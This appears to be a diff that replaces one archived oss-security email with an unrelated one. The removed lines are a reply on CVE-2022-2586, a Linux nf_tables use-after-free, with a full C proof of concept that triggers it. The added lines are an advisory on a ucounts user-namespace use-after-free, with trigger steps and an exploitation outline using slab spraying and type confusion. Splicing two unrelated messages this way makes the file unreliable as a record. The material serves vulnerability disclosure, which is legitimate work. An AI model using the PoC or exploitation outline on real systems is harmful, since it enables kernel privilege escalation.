@@ -1,170 +1,121 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/08/18/1
-Message-ID: <Yv1PDPPSLHQ7ednm@quatroqueijos>
-Date: Wed, 17 Aug 2022 17:26:52 -0300
-From: Thadeu Lima de Souza Cascardo <cascardo@...onical.com>
-To: oss-security@...ts.openwall.com
-Subject: Re: CVE-2022-2586 - Linux kernel nf_tables cross-table reference UAF
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/01/29/1
+Message-ID: <69014e75-e96d-6200-a9d3-13248d35d864@grsecurity.net>
+Date: Sat, 29 Jan 2022 20:07:27 +0100
+From: Mathias Krause <minipli@...ecurity.net>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: Linux kernel: use-after-free of user namespace on shm and mqueue destruction
 Content-Type: text/plain; charset=utf-8
 
-On Tue, Aug 09, 2022 at 02:10:35PM -0300, Thadeu Lima de Souza Cascardo wrote:
-> CVE-2022-2586 - Linux kernel nf_tables cross-table reference UAF
-> 
-> It was discovered that a nft object or expression could reference a nft set on
-> a different nft table, leading to a use-after-free once that table was deleted.
-> 
-> Team Orca of Sea Security (@seasecresponse) working with Trend Micro's Zero Day
-> Initiative discovered that this vulnerability could be exploited for Local
-> Privilege Escalation. This has been reported as ZDI-CAN-17470, and assigned
-> CVE-2022-2586.
-> 
-> This bug was introduced by commit 958bee14d071 ("netfilter: nf_tables: use new
-> transaction infrastructure to handle sets"), which is present since v3.16-rc1.
-> 
-> Exploiting it requires CAP_NET_ADMIN in any user or network namespace.
-> 
-> A PoC that will trigger KASAN is going to be posted in a week.
-> 
-> Fixes have been sent to netfilter-devel@...r.kernel.org and are at
-> https://lore.kernel.org/netfilter-devel/20220809170148.164591-1-cascardo@canonical.com/T/#t.
+Hi!
 
-These have been merged as commits:
+A use-after-free vulnerability was found in the way certain rlimit
+conversions to 'ucounts' were done, affecting kernels containing merge
+commit c54b245d0118 ("Merge branch 'for-linus' of
+git://git.kernel.org/pub/scm/linux/kernel/git/ebiederm/user-namespace")
+which is Linux v5.14 and newer.
 
-470ee20e069a6d05ae549f7d0ef2bdbcee6a81b2
-95f466d22364a33d183509629d0879885b4f547e
-36d5b2913219ac853908b0f1c664345e04313856
+The underlying issue was already noticed last year in a KASAN report[1]
+in the mqueue code but could only be recently root-caused with the help
+of our report and reproducer.
 
-And here is the PoC. It should be linked to libmnl and libnftnl.
+The fix was merged yesterday into Linux mainline:
+https://git.kernel.org/linus/f9d87929d451d3e649699d0f1d74f71f77ad38f5
 
-#include <netdb.h>
-#include <linux/netfilter.h>
-#include <linux/netfilter/nf_tables.h>
-#include <libnftnl/table.h>
-#include <libnftnl/set.h>
-#include <libnftnl/object.h>
-#include <libnftnl/expr.h>
-#include <libmnl/libmnl.h>
-#include <err.h>
+However, in our opinion neither the commit itself nor its merge commit
+(https://git.kernel.org/linus/76fcbc9c7c57a5d4) clearly expresses the
+impact of the vulnerability.
 
-int main(int arg, char **argv)
-{
+See below for some background information about 'ucounts' and our
+analysis of the issue that we previously shared in a similar form with
+security@...nel.org on January 21st:
 
-	struct mnl_socket *s;
-	struct mnl_nlmsg_batch *batch;
-	struct nlmsghdr *nh;
-	char buf[16384];
-	int r;
-	int seq = 0;
+The 'ucounts' scheme "bubbles up" limit changes to the uppermost user
+namespace by attaching and traversing a user namespace to the 'ucounts'
+object. However, that user namespace pointer isn't reference-counted. As
+the lifetime of a 'ucounts' object isn't strictly tied to that of the
+user namespace it was created for, it can outlive the latter, making its
+'ns' member pointing to free'd memory. Such usages may happen in the shm
+and mqueue code by making use of current_ucounts() and getting a
+reference to it via get_ucounts().
 
-	s = mnl_socket_open(NETLINK_NETFILTER);
-	if (!s)
-		err(1, "failed to create netfilter socket");
+We noticed the issue during testing and root-caused it to a
+use-after-free of a user namespace object on shm destruction as follows:
 
-	/* Create table that will be deleted */
-	char *table_name = "table1";
-	struct nftnl_table *table;
-	table = nftnl_table_alloc();
-	nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);
+1/ A process creates a new shm segment.
 
-	/* Create table where an object reference will be */
-	char *table2_name = "table2";
-	struct nftnl_table *table2;
-	table2 = nftnl_table_alloc();
-	nftnl_table_set_str(table2, NFTNL_TABLE_NAME, table2_name);
+2/ It then forks a child that enters a new user namespace, so it gets
+   its own 'ucounts' (alloc_ucounts() will create a new one via
+   inc_user_namespaces(), as the namespaces differ) that gets attached
+   to the new user namespace.
 
-	/* Create object and add it to table1 */
-	char *obj_name = "obj1";
-	struct nftnl_obj *obj;
-	obj = nftnl_obj_alloc();
-	nftnl_obj_set_str(obj, NFTNL_OBJ_NAME, obj_name);
-	nftnl_obj_set_str(obj, NFTNL_OBJ_TABLE, table_name);
-	nftnl_obj_set_u32(obj, NFTNL_OBJ_TYPE, NFT_OBJECT_COUNTER);
-	nftnl_obj_set_u64(obj, NFTNL_OBJ_CTR_BYTES, 0);
+3/ The child process attaches its 'ucounts' to the shm object by a call
+   to semctl(SHM_LOCK), see ipc/shm.c:shmctl_do_lock(), lines 1198 and
+   1203 in particular:
 
-	/* Add set to table2 */
-	char *set_name = "set1";
-	struct nftnl_set *set;
-	set = nftnl_set_alloc();
-	nftnl_set_set_str(set, NFTNL_SET_TABLE, table2_name);
-	nftnl_set_set_str(set, NFTNL_SET_NAME, set_name);
-	nftnl_set_set_u32(set, NFTNL_SET_FAMILY, NFPROTO_IPV4);
-	nftnl_set_set_u32(set, NFTNL_SET_KEY_LEN, 8);
-	nftnl_set_set_u32(set, NFTNL_SET_ID, htonl(0xcafe));
-	nftnl_set_set_u32(set, NFTNL_SET_FLAGS, NFT_SET_OBJECT|NFT_SET_ANONYMOUS);
-	nftnl_set_set_u32(set, NFTNL_SET_OBJ_TYPE, NFT_OBJECT_COUNTER);
+   1197     if (cmd == SHM_LOCK) {
+   1198         struct ucounts *ucounts = current_ucounts();
+   1199
+   1200         err = shmem_lock(shm_file, 1, ucounts);
+   1201         if (!err && !(shp->shm_perm.mode & SHM_LOCKED)) {
+   1202             shp->shm_perm.mode |= SHM_LOCKED;
+   1203             shp->mlock_ucounts = ucounts;
+   1204         }
+   1205         goto out_unlock0;
+   1206     }
 
-	/* Now create a reference to the object at table1 */
-	/* Aha! So this seems to be possible because one can refer to a set in a batch by use of SET_ID instead of SET_NAME */
-	/* So this must be in the same batch. */
-	struct nftnl_set *sx = nftnl_set_alloc();
-	struct nftnl_set_elem *slem = nftnl_set_elem_alloc();
-	int klen[64];
-	nftnl_set_set_str(sx, NFTNL_SET_TABLE, table_name);
-	nftnl_set_set_u32(sx, NFTNL_SET_ID, htonl(0xcafe));
-	nftnl_set_elem_set(slem, NFTNL_SET_ELEM_KEY, &klen, 8);
-	nftnl_set_elem_set_str(slem, NFTNL_SET_ELEM_OBJREF, obj_name);
-	nftnl_set_elem_add(sx, slem);
-	
-	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
-	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
-	mnl_nlmsg_batch_next(batch);
+   shmem_lock() in line 1200 calls user_shm_unlock() which calls
+   get_ucounts() to get a reference to the 'ucounts' object, which
+   allows the ucounts object to outlive its user namespace.
 
-	nh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, NFPROTO_IPV4, NLM_F_CREATE, seq++);
-	nftnl_table_nlmsg_build_payload(nh, table);
-	mnl_nlmsg_batch_next(batch);
+4/ The child process terminates, which leads to the destruction of its
+   task_struct, the various cred objects and, in turn, the user
+   namespace, as there's no reference (but pointers!) to it any more.
+   The 'ucounts' object, however, survives, as it still has a live
+   reference from the shmem_lock() done before. But it now has a
+   dangling 'ns' pointer, as the user namespace was destroyed already.
 
-	nh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, NFPROTO_IPV4, NLM_F_CREATE, seq++);
-	nftnl_table_nlmsg_build_payload(nh, table2);
-	mnl_nlmsg_batch_next(batch);
+5/ The parent process now destroys the shm segment which leads to
+   shm_destroy() calling shmem_lock() with the (still valid) 'ucounts'
+   of the already dead child, leading to ... -> user_shm_unlock() ->
+   dec_rlimit_ucounts() dereferencing a dangling 'ns' pointer when
+   trying to advance 'iter' in line 285:
 
-	nh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWOBJ, NFPROTO_IPV4, NLM_F_CREATE, seq++);
-	nftnl_obj_nlmsg_build_payload(nh, obj);
-	mnl_nlmsg_batch_next(batch);
+   285   for (iter = ucounts; iter; iter = iter->ns->ucounts) {
+   286       long dec = atomic_long_sub_return(v, &iter->ucount[type]);
+   287       WARN_ON_ONCE(dec < 0);
+   288       if (iter == ucounts)
+   289           new = dec;
+   290   }
 
-	nh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWSET, NFPROTO_IPV4, NLM_F_CREATE, seq++);
-	nftnl_set_nlmsg_build_payload(nh, set);
-	mnl_nlmsg_batch_next(batch);
+We shared a reproducer for the bug including exploitation notes with the
+report to security@...nel.org, but we don't intend to share it any
+further, as the above bug description should allow easy recreation
+thereof anyway.
 
-	nh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWSETELEM, NFPROTO_IPV4, NLM_F_CREATE, seq++);
-	nftnl_set_elems_nlmsg_build_payload(nh, sx);
-	mnl_nlmsg_batch_next(batch);
+Exploiting this issue for privilege escalation requires the availability
+of unprivileged user namespaces. With that granted, a possible way of
+exploitation is by reallocating the memory of the released user
+namespace object of step 4 and by introducing a type confusion bug
+(ensure the user namespace release in step 4 empties the complete slab
+page, get it reallocated, e.g. by some kmalloc slab cache and introduce
+a fake 'user_namespace' object, e.g. via 'msg_msg' object spraying)
+which will allow a decrement operation at an attacker controlled kernel
+address (the '->ucounts' pointer of the crafted 'user_namespace'
+object). The decrement value is under attacker control as well (the size
+of the shm segment, up to RLIMIT_MEMLOCK).
 
-	nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
-	mnl_nlmsg_batch_next(batch);
+Beside from patching, a possible mitigation is to disable unprivileged
+user namespaces:
 
-	r = mnl_socket_sendto(s, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch));
-	if (r < 0)
-		err(1, "failed to send message");
+# sysctl -w kernel.unprivileged_userns_clone=0
 
-	/* Delete table with the object */
-	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
-	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
-	mnl_nlmsg_batch_next(batch);
+To our knowledge, no CVE has been assigned to this issue so far.
 
-	nh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELTABLE, NFPROTO_IPV4, NLM_F_CREATE, seq++);
-	nftnl_table_nlmsg_build_payload(nh, table);
-	mnl_nlmsg_batch_next(batch);
+Thanks,
+Mathias
 
-	nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
-	mnl_nlmsg_batch_next(batch);
-
-	r = mnl_socket_sendto(s, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch));
-
-	/* Delete second table */
-	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
-	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
-	mnl_nlmsg_batch_next(batch);
-
-	nh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELTABLE, NFPROTO_IPV4, NLM_F_CREATE, seq++);
-	nftnl_table_nlmsg_build_payload(nh, table2);
-	mnl_nlmsg_batch_next(batch);
-
-	nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
-	mnl_nlmsg_batch_next(batch);
-
-	r = mnl_socket_sendto(s, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch));
+[1]  https://lore.kernel.org/lkml/YZV7Z+yXbsx9p3JN@fixkernel.com/
 
 
-	return 0;
-
-}
+Download attachment "OpenPGP_signature" of type "application/pgp-signature" (666 bytes)
